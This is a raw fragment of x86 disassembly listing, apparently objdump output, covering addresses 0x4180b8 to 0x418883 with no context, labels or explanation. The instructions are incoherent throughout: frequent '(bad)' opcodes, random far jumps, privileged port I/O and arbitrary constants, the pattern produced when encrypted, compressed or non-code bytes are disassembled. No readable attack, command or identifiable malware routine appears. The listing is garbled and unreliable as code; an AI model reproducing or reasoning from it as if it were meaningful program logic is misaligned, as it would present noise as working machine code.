  4180b8:	and    eax,0x74167c1a
  4180be:	push   es
  4180bf:	xchg   ecx,eax
  4180c0:	in     eax,dx
  4180c1:	jmp    0x418055
  4180c3:	in     al,dx
  4180c4:	mov    ch,BYTE PTR [edi+0x7b07afce]
  4180ca:	pop    ss
  4180cb:	leave  
  4180cc:	inc    ebx
  4180cd:	mov    ch,0x6c
  4180cf:	std    
  4180d0:	out    0x3,al
  4180d2:	jae    0x418136
  4180d4:	rcr    BYTE PTR [ecx],1
  4180d6:	sub    eax,0x95445b55
  4180db:	inc    esp
  4180dc:	pop    ecx
  4180dd:	mov    dh,0xa2
  4180df:	mov    bl,0xb5
  4180e1:	push   eax
  4180e2:	imul   BYTE PTR [ebx]
  4180e4:	and    bh,BYTE PTR [ebp-0x6f]
  4180e7:	shl    DWORD PTR [ebp+0x44],0x37
  4180eb:	push   ebp
  4180ec:	stc    
  4180ed:	out    dx,eax
  4180ee:	sub    DWORD PTR [edx-0x2382ea64],edi
  4180f4:	icebp  
  4180f5:	cmc    
  4180f6:	xchg   edx,edx
  4180f8:	jecxz  0x4180f5
  4180fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180fb:	xor    DWORD PTR ds:0xd67e94ed,esp
  418101:	add    DWORD PTR [esi-0x188be9f5],ecx
  418107:	(bad)  
  418108:	inc    ebp
  418109:	clc    
  41810a:	dec    edi
  41810b:	inc    ebx
  41810c:	cmp    bh,BYTE PTR [eax+eiz*4-0x4d]
  418110:	jle    0x41811f
  418112:	inc    ebp
  418113:	xchg   esi,eax
  418114:	mov    eax,ds:0x8b823024
  418119:	xor    BYTE PTR [edx-0x1d4db5d],0xd8
  418120:	mov    ecx,DWORD PTR [esi+0x44]
  418123:	xchg   DWORD PTR [esi+edx*8-0x2b],esp
  418127:	fdivr  st(4),st
  418129:	pusha  
  41812a:	shl    DWORD PTR [esi],cl
  41812c:	add    bh,cl
  41812e:	inc    ecx
  41812f:	inc    ecx
  418130:	xor    edx,DWORD PTR [edi]
  418132:	xor    ebp,DWORD PTR [eax+0x6706d6e4]
  418138:	push   edx
  418139:	mov    esp,0x4144e8de
  41813e:	shr    BYTE PTR [eax],0x7c
  418141:	out    0xec,al
  418143:	bound  edx,QWORD PTR es:[edx-0x53d045fc]
  41814a:	and    al,0xbc
  41814c:	or     BYTE PTR [esi+0x10e40692],0x21
  418153:	mov    edi,0x69e4d086
  418158:	scas   eax,DWORD PTR es:[edi]
  418159:	mov    al,0x46
  41815b:	es xlat BYTE PTR es:[ebx]
  41815e:	dec    edx
  41815f:	push   esp
  418160:	rcl    DWORD PTR [ebp-0x38c4b312],1
  418166:	(bad)  
  418167:	outs   dx,BYTE PTR ds:[esi]
  418168:	cmp    DWORD PTR [ebp-0x79],edi
  41816b:	lahf   
  41816c:	jmp    0xaa20:0xee60858b
  418173:	add    DWORD PTR [eax-0x2d],ecx
  418176:	fbld   TBYTE PTR [ecx+0x22]
  418179:	lea    edi,[ebx]
  41817b:	ds cmp al,dh
  41817e:	xchg   edx,eax
  41817f:	or     dl,al
  418181:	mov    DWORD PTR [edx+0x65212920],ebp
  418187:	mov    dh,0x21
  418189:	enter  0x8cf4,0xac
  41818d:	xchg   esp,eax
  41818e:	or     ebx,eax
  418190:	ins    BYTE PTR es:[edi],dx
  418191:	fld    TBYTE PTR [edi]
  418193:	jp     0x4181fc
  418195:	aas    
  418196:	jnp    0x418118
  418198:	mov    ds:0x601635f8,eax
  41819d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41819e:	add    esi,edi
  4181a0:	add    ecx,DWORD PTR [ecx-0x55]
  4181a3:	cmp    edi,ebp
  4181a5:	xchg   esp,eax
  4181a6:	cld    
  4181a7:	aas    
  4181a8:	gs ins BYTE PTR es:[edi],dx
  4181aa:	es mov ebp,0xb106a469
  4181b0:	mov    DWORD PTR [esi-0x2d],edi
  4181b3:	pop    esp
  4181b4:	push   0xffffff8c
  4181b6:	and    esp,DWORD PTR [edi+0x67199c42]
  4181bc:	jnp    0x4181be
  4181be:	pop    ebp
  4181bf:	loope  0x4181de
  4181c1:	aaa    
  4181c2:	stos   BYTE PTR es:[edi],al
  4181c3:	repnz add eax,0xa04e6b68
  4181c9:	nop
  4181ca:	scas   eax,DWORD PTR es:[edi]
  4181cb:	jns    0x4181ac
  4181cd:	xor    al,0xe7
  4181cf:	adc    eax,0xe3118d4
  4181d4:	or     al,0x86
  4181d6:	pop    edi
  4181d7:	dec    esp
  4181d8:	leave  
  4181d9:	pop    esi
  4181da:	mov    bh,0x9b
  4181dc:	xor    eax,0xcaf67492
  4181e1:	stos   BYTE PTR es:[edi],al
  4181e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e3:	mov    ebx,0xd42a2d8a
  4181e8:	je     0x4181f9
  4181ea:	jne    0x418235
  4181ec:	loop   0x418252
  4181ee:	push   es
  4181ef:	mov    eax,0x91729cf1
  4181f4:	mov    esi,0xd539ef8f
  4181f9:	inc    edi
  4181fa:	add    al,bh
  4181fc:	loope  0x418184
  4181fe:	(bad)  
  4181ff:	mov    esp,0x580b4f33
  418204:	in     al,dx
  418205:	mov    esi,0x812cb9c4
  41820a:	mov    bh,0x2f
  41820c:	mov    esi,0x7077c4f5
  418211:	pop    ss
  418212:	fwait
  418213:	das    
  418214:	imul   edi,DWORD PTR [edi],0xd905b199
  41821a:	push   es
  41821b:	int3   
  41821c:	inc    ebx
  41821d:	pop    esp
  41821e:	shl    DWORD PTR [ecx],1
  418220:	xor    al,BYTE PTR [esi+0x7138018e]
  418226:	push   ebx
  418227:	cmp    BYTE PTR [edi],al
  418229:	into   
  41822a:	repz push 0xffffffc5
  41822d:	mov    ecx,0x72955eb1
  418232:	hlt    
  418233:	jle    0x4181fa
  418235:	fldcw  WORD PTR [eax]
  418237:	ret    
  418238:	mov    al,bh
  41823a:	mov    eax,ds:0xe006a723
  41823f:	rcl    dh,1
  418241:	xor    ch,BYTE PTR [ebp-0x5d5ac7d7]
  418247:	and    dh,bh
  418249:	push   edi
  41824a:	aas    
  41824b:	int    0x19
  41824d:	adc    DWORD PTR cs:[esi],ebx
  418250:	outs   dx,BYTE PTR ds:[esi]
  418251:	mov    eax,ds:0xe84a6a19
  418256:	fs push ebx
  418258:	and    eax,0xdd4f4681
  41825d:	in     eax,0x2a
  41825f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418260:	es (bad) 
  418262:	mov    esi,0x171d9efd
  418267:	and    al,0x8e
  418269:	push   edi
  41826a:	jg     0x4182bc
  41826c:	dec    esi
  41826d:	lds    esp,FWORD PTR [edi-0x43]
  418270:	sub    ch,BYTE PTR [edx-0x4c]
  418273:	pop    eax
  418274:	fdivr  DWORD PTR [ecx]
  418276:	repz sbb esi,DWORD PTR [edx]
  418279:	xadd   edi,ecx
  41827c:	dec    ecx
  41827d:	sub    cl,BYTE PTR [edi]
  41827f:	or     edi,edi
  418281:	add    al,0x2c
  418283:	ficomp DWORD PTR [ecx+eiz*4+0x3b]
  418287:	jo     0x418286
  418289:	fs daa 
  41828b:	and    ebp,eax
  41828d:	aam    0xda
  41828f:	or     bh,BYTE PTR [edx-0x1a869aa2]
  418295:	or     ch,ah
  418297:	xchg   edi,eax
  418298:	sar    ah,1
  41829a:	push   esp
  41829b:	aam    0x7
  41829d:	adc    esp,DWORD PTR [eax+esi*1]
  4182a0:	jo     0x41828c
  4182a2:	outs   dx,DWORD PTR ds:[esi]
  4182a3:	loope  0x4182f1
  4182a5:	xor    DWORD PTR [ecx+0x40],edx
  4182a8:	sub    ah,BYTE PTR [esi-0x6994ab24]
  4182ae:	mov    edx,0x314a875f
  4182b3:	out    dx,al
  4182b4:	mov    al,ds:0x4cc974e4
  4182b9:	mov    edx,0x25f14e5b
  4182be:	popf   
  4182bf:	cmp    eax,DWORD PTR [eax-0x7f3b70d7]
  4182c5:	mov    cl,0xdd
  4182c7:	fldcw  WORD PTR [edx+0xa]
  4182ca:	inc    edx
  4182cb:	mov    ch,0x18
  4182cd:	cmp    al,0xa1
  4182cf:	xchg   edi,eax
  4182d0:	aam    0xcd
  4182d2:	adc    edx,DWORD PTR [edi+0x9]
  4182d5:	xor    edi,ecx
  4182d7:	pop    ecx
  4182d8:	pop    es
  4182d9:	arpl   WORD PTR [edx+0x1c],cx
  4182dc:	or     bh,BYTE PTR [eax]
  4182de:	mov    eax,DWORD PTR [ecx+esi*4]
  4182e1:	dec    ebx
  4182e2:	push   ds
  4182e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e4:	aas    
  4182e5:	sti    
  4182e6:	dec    ebx
  4182e7:	mov    dh,BYTE PTR [ebx]
  4182e9:	cmp    ebx,esi
  4182eb:	and    BYTE PTR [ecx],bl
  4182ed:	ds in  eax,0x9d
  4182f0:	cmp    cl,BYTE PTR [ebx+0x2a]
  4182f3:	pop    ecx
  4182f4:	and    BYTE PTR [ebx+0x2d],dh
  4182f7:	popf   
  4182f8:	scas   eax,DWORD PTR es:[edi]
  4182f9:	push   cs
  4182fa:	enter  0xf9f8,0xfa
  4182fe:	xchg   ebx,eax
  418300:	out    dx,al
  418301:	and    DWORD PTR [edx+0x14bd8263],edx
  418307:	push   edi
  418308:	adc    dh,BYTE PTR [eax+eiz*1]
  41830b:	mov    edx,0xe3eb5741
  418310:	mov    ds:0x1a41e21,eax
  418315:	push   ss
  418316:	adc    al,0xb7
  418318:	cli    
  418319:	ins    BYTE PTR es:[edi],dx
  41831a:	shl    DWORD PTR [eax+0x6c],0x67
  41831e:	and    cl,bl
  418320:	(bad)  
  418321:	xor    BYTE PTR [ecx+eax*1+0x0],cl
  418325:	mov    dh,0x57
  418327:	push   cs
  418328:	gs fs call 0x297a886a
  41832f:	jbe    0x418334
  418331:	arpl   WORD PTR [ebp-0x4ea55601],si
  418337:	pop    esp
  418338:	xor    eax,0x726a2f27
  41833d:	fs (bad) 
  41833f:	sub    eax,0x56cd4368
  418344:	stos   DWORD PTR es:[edi],eax
  418345:	out    dx,al
  418346:	dec    eax
  418347:	and    BYTE PTR [ebx+edx*8-0x2fa0b3bb],cl
  41834e:	mov    bl,0x27
  418350:	cmp    bl,BYTE PTR [edi-0x63]
  418353:	dec    ebx
  418354:	pop    ds
  418355:	fst    QWORD PTR [esi-0x111fb9fa]
  41835b:	adc    al,0x1a
  41835d:	cmp    cl,BYTE PTR [edi-0x377d410f]
  418363:	xchg   BYTE PTR [ebp+0x53],dh
  418366:	adc    eax,0x940dddf8
  41836b:	xor    al,BYTE PTR [esi+0x5094cf19]
  418371:	psubusw mm0,QWORD PTR [ecx]
  418374:	adc    DWORD PTR [edi+0x7c],0xffffffe1
  418378:	cld    
  418379:	dec    esp
  41837a:	mov    dh,0xb6
  41837c:	fstp   QWORD PTR [ebx]
  41837e:	cmp    al,0xd2
  418380:	push   ss
  418381:	inc    edx
  418382:	sub    esp,esp
  418384:	leave  
  418385:	shr    eax,0x70
  418388:	scas   al,BYTE PTR es:[edi]
  418389:	ficomp WORD PTR [edx+ebx*4]
  41838c:	sub    eax,0x402e32ae
  418391:	dec    ecx
  418392:	mov    cl,0xb0
  418394:	mov    dh,0x91
  418396:	lock aaa 
  418398:	jmp    0x260d:0x62d3fb6f
  41839f:	ror    edi,1
  4183a1:	pop    edi
  4183a2:	adc    BYTE PTR [ebx-0x26],dl
  4183a5:	dec    ecx
  4183a6:	jp     0x41839c
  4183a8:	jmp    0xd6a3:0x6a30dc92
  4183af:	xlat   BYTE PTR ds:[ebx]
  4183b0:	or     al,0x6c
  4183b2:	sbb    DWORD PTR gs:[ecx],eax
  4183b5:	ror    edx,0xa6
  4183b8:	pop    esp
  4183b9:	aas    
  4183ba:	(bad)  
  4183bb:	call   0x36a9:0x1805d39f
  4183c2:	push   0x2e
  4183c4:	int3   
  4183c5:	or     al,BYTE PTR [esi+0x236db89b]
  4183cb:	(bad)  
  4183cc:	in     al,dx
  4183cd:	outs   dx,DWORD PTR ds:[esi]
  4183ce:	es jmp 0x41be:0xcb5b6be2
  4183d6:	nop
  4183d7:	mov    bl,0xe
  4183d9:	mov    al,0x92
  4183db:	jno    0x4183de
  4183dd:	pop    ebx
  4183de:	enter  0xa3df,0x13
  4183e2:	mov    al,0x22
  4183e4:	cs cmc 
  4183e6:	and    BYTE PTR [edi-0x1fe55b51],dl
  4183ec:	arpl   WORD PTR [edi],ax
  4183ee:	dec    edx
  4183ef:	(bad)  
  4183f0:	fmul   QWORD PTR [esi]
  4183f2:	sub    eax,0x3bafe299
  4183f7:	test   BYTE PTR [ebp+0x54],ch
  4183fa:	mov    ah,0xb9
  4183fc:	lock ins BYTE PTR es:[edi],dx
  4183fe:	outs   dx,BYTE PTR ds:[esi]
  4183ff:	sti    
  418400:	mov    bh,0x49
  418402:	mov    edx,edi
  418404:	aam    0x26
  418406:	dec    ecx
  418407:	popf   
  418408:	push   esi
  418409:	and    edi,DWORD PTR [edi+eiz*1-0x755d4294]
  418410:	fimul  WORD PTR [ecx+0x2f]
  418413:	jne    0x418451
  418415:	js     0x4183e7
  418417:	dec    esp
  418418:	mov    ds:0xe6a3bc60,eax
  41841d:	popf   
  41841e:	push   es
  41841f:	test   DWORD PTR [edx],esi
  418421:	push   ecx
  418422:	dec    edi
  418423:	or     eax,0x78069051
  418428:	sahf   
  418429:	inc    ebx
  41842a:	daa    
  41842b:	push   edx
  41842c:	int3   
  41842d:	hlt    
  41842e:	push   cs
  41842f:	add    DWORD PTR ds:0x7579b1ee,edx
  418435:	or     ebp,0x28b23e43
  41843b:	push   edx
  41843c:	dec    esp
  41843d:	call   0x8a77:0xbcbfee9d
  418444:	mov    esi,0xad61ea1
  418449:	pop    ebp
  41844a:	jns    0x4184c3
  41844c:	lods   al,BYTE PTR ds:[esi]
  41844d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41844e:	pop    ebp
  41844f:	cmp    BYTE PTR [edx+0x0],0x45
  418453:	pop    ds
  418454:	or     al,0x26
  418456:	dec    edi
  418457:	lea    eax,[esi+0x11]
  41845a:	inc    edi
  41845b:	push   ds
  41845c:	(bad)  [ebx]
  41845e:	out    dx,eax
  41845f:	adc    bl,BYTE PTR ds:0xc9738d9b
  418465:	(bad)  
  418466:	mov    ah,0x5f
  418468:	mov    ?,WORD PTR [esi]
  41846a:	les    edi,FWORD PTR [ebp+0x2014c2fb]
  418470:	cmp    al,0x82
  418472:	(bad)  
  418473:	test   eax,0x751fa208
  418478:	ins    DWORD PTR es:[edi],dx
  418479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41847a:	dec    ecx
  41847b:	cli    
  41847c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847d:	jae    0x418499
  41847f:	nop
  418480:	push   esi
  418481:	outs   dx,BYTE PTR ds:[esi]
  418482:	ins    DWORD PTR es:[edi],dx
  418483:	push   ds
  418484:	leave  
  418485:	sbb    cl,BYTE PTR [esp+esi*4-0xc59c179]
  41848c:	mov    eax,0xa1006f17
  418491:	xor    dl,BYTE PTR [edi-0x2c]
  418494:	mov    edx,0x4556fd89
  418499:	mov    dl,0x90
  41849b:	jno    0x418444
  41849d:	jp     0x41848e
  41849f:	and    edx,DWORD PTR [edx]
  4184a1:	cmp    ah,0xae
  4184a4:	out    0xf6,al
  4184a6:	mov    ah,0x8a
  4184a8:	(bad)  
  4184a9:	jnp    0x41844f
  4184ab:	test   BYTE PTR [ebp-0x2e],cl
  4184ae:	into   
  4184af:	push   ds
  4184b0:	rcr    DWORD PTR [eax+0x1f],0xa6
  4184b4:	pop    esp
  4184b5:	stc    
  4184b6:	adc    DWORD PTR [ecx],esp
  4184b8:	lock sub eax,0x8e32f72b
  4184be:	aad    0xb7
  4184c0:	dec    ebx
  4184c1:	mov    cl,0x81
  4184c3:	inc    ebp
  4184c4:	or     ch,BYTE PTR [ebp+esi*8+0x17819fbc]
  4184cb:	mov    al,0x9
  4184cd:	sar    ah,cl
  4184cf:	mov    esi,0xb0b3fe39
  4184d4:	jae    0x418497
  4184d6:	dec    esi
  4184d7:	xchg   esi,eax
  4184d8:	or     edx,eax
  4184da:	jge    0x41847f
  4184dc:	iret   
  4184dd:	push   esi
  4184de:	mov    esp,0x5795de3e
  4184e3:	xchg   esp,eax
  4184e4:	pop    edi
  4184e5:	sub    bl,BYTE PTR [edi+0x41]
  4184e8:	int    0x66
  4184ea:	mov    fs,WORD PTR [ecx-0x2b]
  4184ed:	(bad)
  4184f0:	clc    
  4184f1:	and    eax,0xb84d9176
  4184f6:	adc    edx,ecx
  4184f8:	dec    edx
  4184f9:	fbstp  TBYTE PTR [ecx]
  4184fb:	jns    0x4184bf
  4184fd:	mov    fs,WORD PTR [esi+0x56953060]
  418503:	jne    0x4184a5
  418505:	fnstenv [edx]
  418507:	repnz outs dx,BYTE PTR ds:[esi]
  418509:	(bad)  
  41850a:	dec    DWORD PTR [edi-0x2a]
  41850d:	sub    BYTE PTR [ebx],dl
  41850f:	aam    0x2
  418511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418512:	inc    ebp
  418513:	mov    ebp,0xae97fa50
  418518:	jnp    0x4184ec
  41851a:	mov    dh,0xe1
  41851c:	xor    al,0xb5
  41851e:	pop    esi
  41851f:	jno    0x418500
  418521:	mov    ebx,DWORD PTR [edi+edi*8-0xb]
  418525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418526:	adc    esi,DWORD PTR [esp+edi*2]
  418529:	ret    0xf9af
  41852c:	push   0x7
  41852e:	clc    
  41852f:	or     al,0x6e
  418531:	push   edi
  418532:	dec    eax
  418533:	xor    eax,0x5d036a7
  418538:	cli    
  418539:	cmp    eax,0xbb04af54
  41853e:	sti    
  41853f:	jg     0x418516
  418541:	repnz out dx,al
  418543:	fcomp  DWORD PTR [ebx-0x1f]
  418546:	imul   ecx,DWORD PTR [edx],0xffffff8f
  418549:	loop   0x418570
  41854b:	push   ds
  41854c:	inc    edi
  41854d:	sub    DWORD PTR [ebp+0x12],esi
  418550:	(bad)  
  418551:	pop    ebx
  418552:	bound  edi,QWORD PTR [esi+0xd]
  418555:	pop    esp
  418556:	dec    DWORD PTR [eax+0x49f1a036]
  41855c:	fnstenv [edx]
  41855e:	push   eax
  41855f:	xchg   BYTE PTR [ebx+0x75c4b21b],dl
  418565:	or     edi,ecx
  418567:	push   cs
  418568:	mov    ebx,0xab9fa0be
  41856d:	sahf   
  41856e:	jge    0x4184f6
  418570:	mov    ah,0xa3
  418572:	jecxz  0x418529
  418574:	cmp    ebp,DWORD PTR [ecx]
  418576:	fwait
  418577:	mov    edx,0xa96fb1c1
  41857c:	or     DWORD PTR [edx-0x6a],eax
  41857f:	retf   0x2348
  418582:	adc    DWORD PTR [ebx],ecx
  418584:	mov    bh,BYTE PTR ds:0xa325ed5f
  41858a:	add    BYTE PTR [esi-0x6eb5524f],al
  418590:	call   0xcfd0:0x6a554cad
  418597:	inc    ebx
  418598:	and    ah,BYTE PTR [edx+0x2549083f]
  41859e:	aad    0xc6
  4185a0:	in     al,dx
  4185a1:	icebp  
  4185a2:	test   BYTE PTR [eax-0x5f],ah
  4185a5:	or     BYTE PTR [ebx+esi*8],bh
  4185a8:	(bad)  
  4185a9:	mov    al,ds:0x557ef7a9
  4185ae:	adc    BYTE PTR [edi],bl
  4185b0:	pop    edx
  4185b1:	loopne 0x418541
  4185b3:	lods   al,BYTE PTR ds:[esi]
  4185b4:	or     dl,BYTE PTR [ecx+ebx*2-0x29]
  4185b8:	mov    edi,0xae0aeb0b
  4185bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185be:	sbb    eax,0xce770e2
  4185c3:	aad    0x12
  4185c5:	inc    edi
  4185c6:	xchg   ebx,eax
  4185c7:	in     al,0xd8
  4185c9:	es out 0x1f,al
  4185cc:	push   ecx
  4185cd:	push   eax
  4185ce:	and    edi,DWORD PTR [ebp+0x14c71277]
  4185d4:	cmp    DWORD PTR [ecx-0x6001cd5e],0x4349dc9f
  4185de:	mov    bh,0xac
  4185e0:	push   0x1a
  4185e2:	mov    bh,0x67
  4185e4:	iret   
  4185e5:	inc    ecx
  4185e6:	lea    ebp,[edi]
  4185e8:	jge    0x41863e
  4185ea:	out    dx,al
  4185eb:	(bad)  
  4185ec:	out    dx,eax
  4185ed:	enter  0xa0c0,0x7d
  4185f1:	mov    bh,BYTE PTR [edi-0x723fff93]
  4185f7:	mov    esp,0xb7aebd61
  4185fc:	clc    
  4185fd:	dec    eax
  4185fe:	test   BYTE PTR [esi-0x35],bl
  418601:	mov    eax,0xb9f976a3
  418606:	inc    ecx
  418607:	pop    eax
  418608:	push   ecx
  418609:	pop    eax
  41860a:	not    DWORD PTR [eax+0x6164f541]
  418610:	or     BYTE PTR [eax],0x59
  418613:	push   ds
  418614:	push   ss
  418615:	fisttp WORD PTR ds:0xf2f8561f
  41861b:	xor    ebp,ecx
  41861d:	mov    ds:0x663e93a7,al
  418622:	je     0x4186a1
  418624:	jne    0x418669
  418626:	or     BYTE PTR [ebx-0x7f6d18d6],dh
  41862c:	mov    BYTE PTR [eax],ch
  41862e:	push   0xb6660b32
  418633:	(bad)  
  418634:	mov    edx,0x772cb52b
  418639:	out    0xc4,eax
  41863b:	jno    0x41861d
  41863d:	enter  0xdfd7,0x48
  418641:	sub    ebx,DWORD PTR [esi-0x458822b5]
  418647:	jb     0x418615
  418649:	rcl    bl,0x47
  41864c:	sbb    eax,0x470252ca
  418651:	not    BYTE PTR [esi]
  418653:	test   DWORD PTR [esi],edx
  418655:	mov    ah,0xa6
  418657:	ds mov edx,0xa6eb2b39
  41865d:	adc    eax,0x6e1724d3
  418662:	(bad)  
  418663:	aam    0x66
  418665:	add    eax,0xfddc10a
  41866a:	aaa    
  41866b:	sti    
  41866c:	mov    bh,0xc9
  41866e:	cmp    BYTE PTR [ebx],0x85
  418671:	or     BYTE PTR [eax+0x55204b9f],al
  418677:	cmp    DWORD PTR [esi-0x22b1cbd6],ebx
  41867d:	mov    WORD PTR [ecx+0x29f8b812],gs
  418683:	pop    edi
  418684:	das    
  418685:	push   esp
  418686:	sbb    dl,BYTE PTR [eax]
  418688:	push   ds
  418689:	mov    bl,al
  41868b:	div    BYTE PTR fs:[edi-0x29]
  41868f:	in     al,0xdb
  418691:	sub    eax,0x9cce643f
  418696:	pop    edi
  418697:	enter  0xc664,0x46
  41869b:	es mov ah,0x13
  41869e:	enter  0x171a,0xa3
  4186a2:	dec    esi
  4186a3:	iret   
  4186a4:	sahf   
  4186a5:	cmc    
  4186a6:	test   al,0x81
  4186a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186a9:	les    edx,FWORD PTR [ecx+eiz*4+0x75970e88]
  4186b0:	jmp    0xedbf:0x843669c7
  4186b7:	std    
  4186b8:	imul   edi,DWORD PTR [ecx+0x16523fcc],0x1d
  4186bf:	repnz loopne 0x418708
  4186c2:	loop   0x41870c
  4186c4:	mov    bl,0x60
  4186c6:	int    0xbf
  4186c8:	cmp    DWORD PTR [eax],esp
  4186ca:	pop    edx
  4186cb:	(bad)  
  4186cc:	enter  0xabc,0xa5
  4186d0:	dec    ecx
  4186d1:	arpl   WORD PTR [edx-0x74],ax
  4186d4:	mov    dl,0xf3
  4186d6:	cmc    
  4186d7:	or     al,0x9
  4186d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186da:	out    0x13,al
  4186dc:	sbb    ebp,DWORD PTR [ecx+0x16ec083b]
  4186e2:	and    eax,0x5dc726a0
  4186e7:	sbb    eax,ebp
  4186e9:	inc    edi
  4186ea:	mov    ecx,0xc8823681
  4186ef:	adc    DWORD PTR [edx+0x7902f7d2],esp
  4186f5:	out    dx,al
  4186f6:	std    
  4186f7:	jmp    0xd6895810
  4186fc:	jmp    0x4186e7
  4186fe:	hlt    
  4186ff:	out    dx,eax
  418700:	lahf   
  418701:	je     0x418747
  418703:	inc    ebx
  418704:	loop   0x4186fb
  418706:	cmp    ch,BYTE PTR [edx-0x757f447a]
  41870c:	and    BYTE PTR [ecx-0x4d],cl
  41870f:	push   edx
  418710:	scas   eax,DWORD PTR es:[edi]
  418711:	je     0x41878e
  418713:	mov    ebp,ebx
  418715:	adc    bl,BYTE PTR [ecx+0x29]
  418718:	mov    eax,0x9c1db20b
  41871d:	dec    eax
  41871e:	mov    ss,WORD PTR [ecx+0x1a9bee78]
  418724:	and    al,0xd5
  418726:	loopne 0x418771
  418728:	sub    BYTE PTR [edi],al
  41872a:	jl     0x41874f
  41872c:	or     ch,0x30
  41872f:	imul   eax,DWORD PTR [ebx+0x56],0x643e57a7
  418736:	adc    al,0xb6
  418738:	in     eax,0x6e
  41873a:	jp     0x418737
  41873c:	(bad)  
  41873d:	cld    
  41873e:	cmc    
  41873f:	dec    ebx
  418740:	dec    eax
  418741:	pop    ds
  418742:	mov    ebp,0x83070f31
  418747:	fmul   DWORD PTR [edi+0xfb55b26]
  41874d:	ins    BYTE PTR es:[edi],dx
  41874e:	ins    DWORD PTR es:[edi],dx
  41874f:	xor    eax,0x5653ae83
  418754:	loope  0x418764
  418756:	inc    ebx
  418757:	addr16 or al,0x61
  41875a:	push   ebx
  41875b:	add    ecx,DWORD PTR [ecx+0x3f473be]
  418761:	xchg   ebp,eax
  418762:	and    eax,eax
  418764:	sahf   
  418765:	clc    
  418766:	mov    bl,0x5e
  418768:	and    BYTE PTR [ecx+0x2250b2cb],0x9e
  41876f:	push   0x8ee6e1ae
  418774:	sub    eax,esp
  418776:	enter  0x67ae,0x6e
  41877a:	sbb    bl,BYTE PTR [edx+0x49]
  41877d:	arpl   WORD PTR [edi+0x46cfe5b9],si
  418783:	xchg   edx,eax
  418784:	in     eax,dx
  418785:	pop    ds
  418786:	loopne 0x418715
  418788:	sub    eax,edi
  41878a:	fbstp  TBYTE PTR [edx-0x5e6b1d1]
  418790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418791:	(bad)  
  418792:	leave  
  418793:	jne    0x4187e1
  418795:	mov    BYTE PTR [esi+0xd0eff29],ch
  41879b:	push   ebx
  41879c:	aad    0x24
  41879e:	mov    dh,0x12
  4187a0:	test   al,0x76
  4187a2:	xor    DWORD PTR ds:0xbd57b343,edx
  4187a8:	retf   0x3953
  4187ab:	cmp    edi,DWORD PTR [eax+0x18]
  4187ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187af:	xor    BYTE PTR [edi-0x109fe9d6],dh
  4187b5:	push   esp
  4187b6:	ins    DWORD PTR es:[edi],dx
  4187b7:	lahf   
  4187b8:	mov    al,ds:0x9ad24621
  4187bd:	mov    ds:0x52f8103c,al
  4187c2:	add    al,0x38
  4187c4:	jae    0x418843
  4187c6:	call   0x5b541f52
  4187cb:	jl     0x41881b
  4187cd:	ins    BYTE PTR es:[edi],dx
  4187ce:	xchg   edi,eax
  4187cf:	in     eax,dx
  4187d0:	std    
  4187d1:	xchg   ebx,eax
  4187d2:	stos   DWORD PTR es:[edi],eax
  4187d3:	rcl    DWORD PTR [ecx+0x22],0xf6
  4187d7:	mov    dl,0xe6
  4187d9:	mov    bh,0xbb
  4187db:	adc    edi,DWORD PTR [esi-0x3d]
  4187de:	loopne 0x41877d
  4187e0:	popa   
  4187e1:	clc    
  4187e2:	loope  0x41881f
  4187e4:	or     esp,DWORD PTR [ebx-0x7c46e954]
  4187ea:	imul   esi,ecx,0x31
  4187ed:	sbb    eax,0xdde22b22
  4187f2:	adc    al,0x21
  4187f4:	xchg   esp,eax
  4187f5:	push   cs
  4187f6:	fimul  WORD PTR [ecx+ecx*1+0x0]
  4187fa:	push   edi
  4187fb:	out    0x8,eax
  4187fd:	pop    ss
  4187fe:	jne    0x4187ae
  418800:	(bad)  
  418801:	jmp    0xc4357427
  418806:	mov    ebp,0xab4167de
  41880b:	fist   DWORD PTR [bp+di]
  41880e:	fmul   DWORD PTR [eax]
  418810:	jge    0x41879b
  418812:	lock out dx,al
  418814:	out    dx,al
  418815:	outs   dx,BYTE PTR ds:[esi]
  418816:	outs   dx,DWORD PTR ds:[esi]
  418817:	cmp    cl,BYTE PTR [esi-0x3c]
  41881a:	mov    edx,gs
  41881c:	icebp  
  41881d:	sbb    ecx,DWORD PTR [eax+0x76]
  418820:	jmp    0x8196:0xd622ebf1
  418827:	loopne 0x41881c
  418829:	xor    DWORD PTR [esi-0x4adb7bf],ecx
  41882f:	mov    al,0xf3
  418831:	sbb    bh,dl
  418833:	cmp    esi,esp
  418835:	cdq    
  418836:	out    0xde,al
  418838:	mov    ebx,0x52b50a7a
  41883d:	push   0x5e
  41883f:	outs   dx,DWORD PTR ds:[esi]
  418840:	pop    eax
  418841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418842:	repz add BYTE PTR [esi+0x1f],bl
  418846:	pop    esp
  418847:	gs jb  0x4188bd
  41884a:	nop
  41884b:	xchg   ebp,eax
  41884c:	stos   DWORD PTR es:[edi],eax
  41884d:	or     eax,0x4aa1a087
  418852:	add    al,cl
  418854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418855:	mov    dl,ch
  418857:	stc    
  418858:	jmp    0xf237cf97
  41885d:	mov    al,ds:0x234bf65f
  418862:	push   esp
  418863:	imul   ebx,DWORD PTR [esi-0x2b],0x80c49d3d
  41886a:	and    ebx,esp
  41886c:	push   0x1c185ebc
  418871:	adc    BYTE PTR [edx],ch
  418873:	mov    ch,0xd4
  418875:	mov    dl,0x39
  418877:	dec    ecx
  418878:	enter  0x7029,0x96
  41887c:	mov    cl,0x77
  41887e:	mov    WORD PTR [ecx+edx*2+0xe],fs
  418882:	pop    ebp
  418883:	adc    ebx,DWORD PTR [edi-0x58c265ca]
